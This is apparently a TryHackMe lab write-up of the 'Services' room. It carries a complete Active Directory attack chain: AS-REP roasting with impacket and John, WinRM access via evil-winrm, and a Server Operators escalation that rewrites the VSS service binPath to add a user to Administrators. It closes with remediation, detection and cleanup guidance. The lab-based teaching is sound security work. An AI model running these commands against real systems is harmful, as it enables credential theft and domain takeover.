---
title: "TryHackMe: Services"
date: 2026-06-28 23:40:00 +0200
categories: [TryHackMe]
tags:
  - active-directory
  - windows
  - kerberos
  - as-rep-roasting
  - winrm
  - server-operators
  - privilege-escalation
  - services
description: >-
  Services chained public identity disclosure and AS-REP roasting into
  WinRM access as j.rock, then abused Server Operators service-control
  rights to obtain local administrative control.
author: lenovolegion7
media_subpath: /images/tryhackme_services
image:
  path: room_image.webp
  alt: "Original TryHackMe Services room artwork"
toc: true
comments: false
---

Services is an Active Directory compromise lab focused on identity exposure, Kerberos AS-REP roasting, remote management access, and Windows service-control abuse. The validated path moved from information disclosed by the public web site to a crackable AS-REP response for `j.rock`, WinRM access, `Server Operators` privileges, service reconfiguration, and ultimately local administrative control.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe Services room card](room_card.webp){: w="300" h="269" .shadow }](https://tryhackme.com/room/services){: .center }

## Executive Summary

The target was a Windows Active Directory host in the `services.local` domain:

```text
WIN-SERVICES.services.local
services.local
```

The public IIS site exposed an internal email naming convention and staff names. Those details were sufficient to build valid username candidates. Kerberos testing showed that `j.rock` did not require pre-authentication, allowing AS-REP material to be requested without a valid password.

The AS-REP material was cracked offline, and the recovered credential provided authenticated SMB, RDP, and WinRM access. A WinRM shell showed that `j.rock` was a member of `BUILTIN\Server Operators` and `Remote Management Users`.

`Server Operators` rights allowed the configuration of the Volume Shadow Copy service to be changed so that a command ran as `LocalSystem`. That command added `j.rock` to the local `Administrators` group. After reconnecting with a new administrative token, the Administrator objective could be accessed.

> **Result:** Public identity leakage led to AS-REP roasting, credential compromise, WinRM access, Windows service abuse, and full local administrative control.
{: .prompt-danger }

## Scope and Methodology

The assessment covered the single TryHackMe Services host and its exposed network services.

Observed services included:

```text
53/tcp       DNS
80/tcp       IIS
88/tcp       Kerberos
135/tcp      MSRPC
139/tcp      NetBIOS
389/tcp      LDAP
445/tcp      SMB
464/tcp      Kerberos password service
593/tcp      RPC over HTTP
636/tcp      LDAPS
3268/tcp     Global Catalog
3269/tcp     Global Catalog TLS
3389/tcp     RDP
5985/tcp     WinRM
9389/tcp     AD Web Services
47001/tcp    Windows remote management
```

Anonymous LDAP user enumeration was restricted. SMB null authentication allowed a connection but did not permit anonymous share enumeration. DNS zone transfer was denied.

## Attack Path Overview

1. **Service enumeration** — identified Windows AD services and the `services.local` domain.
2. **Public web review** — discovered `j.doe@services.local` and staff names useful for username generation.
3. **Username validation** — confirmed several candidate users through Kerberos behavior.
4. **AS-REP roasting** — `j.rock` did not require Kerberos pre-authentication.
5. **Offline password cracking** — recovered a reusable password for `j.rock`.
6. **Credentialed access** — SMB, RDP, and WinRM accepted the compromised account.
7. **Privilege enumeration** — identified `Server Operators` and `Remote Management Users` membership.
8. **Service-control abuse** — changed the VSS service binary path to execute a command as `LocalSystem`.
9. **Administrative token** — after reconnecting, `j.rock` was a local administrator.
10. **Objective recovery** — accessed the Administrator-owned flag file after taking ownership and adjusting permissions.

## Web-Derived Identity Information

The IIS site was titled:

```text
Above Services
```

Public content exposed:

```text
j.doe@services.local
Jack Rock
Joanne Doe
Johnny LaRusso
Will Masters
```

From this information, likely usernames were generated:

```text
j.doe
j.rock
j.larusso
w.masters
```

This did not directly provide access, but it significantly reduced the search space for Kerberos-based account testing.

## AS-REP Roasting

Kerberos behavior was tested against the generated usernames:

```console
$ impacket-GetNPUsers \
  services.local/ \
  -dc-ip TARGET_IP \
  -usersfile users.txt \
  -no-pass \
  -request \
  -format john
```

Most tested accounts required Kerberos pre-authentication. `j.rock` did not.

The KDC therefore returned AS-REP material that could be attacked offline:

```text
j.rock : [REDACTED]
```

The captured material was processed with John:

```console
$ john \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  asrep.hashes
```

The recovered credential is intentionally redacted:

```text
services.local\j.rock : [REDACTED]
```

## Credentialed Access

The compromised credential was valid across multiple exposed services.

SMB authentication:

```console
$ nxc smb TARGET_IP \
  -d services.local \
  -u j.rock \
  -p [REDACTED] \
  --shares
```

WinRM authentication:

```console
$ nxc winrm TARGET_IP \
  -d services.local \
  -u j.rock \
  -p [REDACTED]
```

RDP authentication was also accepted.

A WinRM shell was established with:

```console
$ evil-winrm \
  -i TARGET_IP \
  -u 'services.local\j.rock' \
  -p '[REDACTED]'
```

This provided the initial interactive shell.

## Privilege Enumeration

Group membership showed:

```text
BUILTIN\Server Operators
BUILTIN\Remote Management Users
```

`Server Operators` was the critical privilege. Members of this group can manage services on the Windows host, creating a path to execute commands in the context of privileged services.

Credentialed SMB enumeration also showed administrative-share exposure:

```text
ADMIN$  READ
C$      READ,WRITE
```

## Server Operators Privilege Escalation

The Volume Shadow Copy service was reconfigured so its binary path executed a command that added the compromised domain user to the local Administrators group:

```text
sc.exe config VSS binPath= "C:\Windows\System32\cmd.exe /c net localgroup Administrators services\j.rock /add > C:\Users\Public\addadmin.txt 2>&1"
sc.exe start VSS
```

Because the service executed as `LocalSystem`, the group modification was performed with system-level authority.

After disconnecting and reconnecting, the account received a new token containing local administrator membership.

The Administrator-owned objective file was then accessed:

```text
takeown /F C:\Users\Administrator\Desktop\root.txt
icacls C:\Users\Administrator\Desktop\root.txt /grant "services\j.rock:F"
type C:\Users\Administrator\Desktop\root.txt
```

The user and Administrator flags are intentionally published only as:

```text
THM{[REDACTED]}
```

## Findings

### SV-01 - Kerberos Pre-Authentication Disabled for `j.rock`

- **Severity:** Critical
- **Impact:** Offline password cracking and initial domain credential compromise

The `j.rock` account was configured without required Kerberos pre-authentication. This allowed an unauthenticated attacker to request AS-REP material suitable for offline cracking.

**Remediation:**

- require Kerberos pre-authentication for all normal user accounts;
- audit Active Directory for `UF_DONT_REQUIRE_PREAUTH`;
- investigate documented technical exceptions;
- monitor event 4768 for unusual AS-REP requests without pre-authentication.

### SV-02 - Weak / Crackable Password for `j.rock`

- **Severity:** High
- **Impact:** Rapid recovery of a reusable domain credential

The AS-REP material was crackable with a common wordlist.

**Remediation:**

- rotate the affected credential;
- enforce long unique passphrases;
- block known breached passwords;
- use password-quality controls such as password filters or equivalent protection;
- require MFA or just-in-time access for remote management accounts where applicable.

### SV-03 - Excessive `Server Operators` Membership

- **Severity:** Critical
- **Impact:** Service-control abuse leading to administrative compromise

The compromised user was a member of `BUILTIN\Server Operators`. This granted enough service-management capability to execute an arbitrary command through a `LocalSystem` service.

**Remediation:**

- remove normal users from `Server Operators`;
- review all privileged local and domain group memberships;
- implement just-enough administration;
- use time-bound privileged access and hardened administrative workstations.

### SV-04 - WinRM Exposed to an Over-Privileged Account

- **Severity:** High
- **Impact:** Immediate interactive remote command execution

The compromised credentials were accepted by WinRM, giving direct command execution on the target.

**Remediation:**

- restrict WinRM to approved management hosts and administrators;
- apply Windows Firewall source restrictions;
- consider JEA or equivalent delegated-management controls;
- monitor WinRM logon activity for support and non-administrative accounts.

### SV-05 - Administrative Share Access for Compromised User

- **Severity:** High
- **Impact:** Read/write access to sensitive administrative paths

Credentialed SMB enumeration showed `C$` read/write access and `ADMIN$` read access.

**Remediation:**

- ensure administrative shares are accessible only by approved administrators;
- remove broad file-share rights;
- monitor access to `C$` and `ADMIN$`;
- block SMB access from untrusted networks and workstations.

### SV-06 - Public Disclosure of User Naming Patterns

- **Severity:** Medium
- **Impact:** Accelerated username discovery for Kerberos and password attacks

The public web site exposed an internal email address and staff names sufficient to derive valid AD usernames.

**Remediation:**

- reduce publication of internal naming conventions;
- use role-based public contact addresses where appropriate;
- monitor and rate-limit authentication endpoints for enumeration and spraying;
- separate public communications data from internal identity conventions where feasible.

## Remediation Summary

Priority actions are:

1. Re-enable Kerberos pre-authentication for `j.rock`.
2. Rotate the compromised password and investigate reuse.
3. Remove unnecessary `Server Operators` and local Administrators memberships.
4. Restore altered service configuration.
5. Restrict WinRM to approved administration paths.
6. Improve password quality and breached-password controls.
7. Monitor AS-REP roasting, WinRM logons, service configuration changes, and local group membership changes.
8. Review access to `C$` and `ADMIN$`.
9. Reduce public disclosure of internal staff naming conventions.

## Detection Opportunities

Useful monitoring opportunities include:

- Kerberos AS-REP requests for accounts without pre-authentication;
- successful WinRM logons for non-administrative support users;
- Windows service binary-path configuration changes;
- local group changes that add domain users to `Administrators`;
- SMB access to `C$` or `ADMIN$` from non-standard systems.

## Cleanup Considerations

The assessment source documents cleanup of the modified privilege path.

The VSS service binary path should be restored to:

```text
C:\Windows\system32\vssvc.exe
```

The temporary administrator membership should also be removed:

```text
net localgroup Administrators services\j.rock /delete
```

In a production incident, the compromised credential should additionally be rotated and the affected host reviewed for unauthorized service or group modifications.

## Conclusion

Services demonstrates how seemingly modest identity leakage can combine with an Active Directory configuration weakness to produce a full compromise path.

The critical chain was:

```text
Public identity disclosure
-> username generation
-> AS-REP roasting of j.rock
-> offline credential recovery
-> WinRM shell
-> Server Operators service control
-> LocalSystem command execution
-> local Administrators membership
-> Administrator objective
```

The strongest defensive controls are to require Kerberos pre-authentication, use resistant passwords, tightly restrict privileged groups such as `Server Operators`, and limit remote management access to explicitly approved administrative workflows.
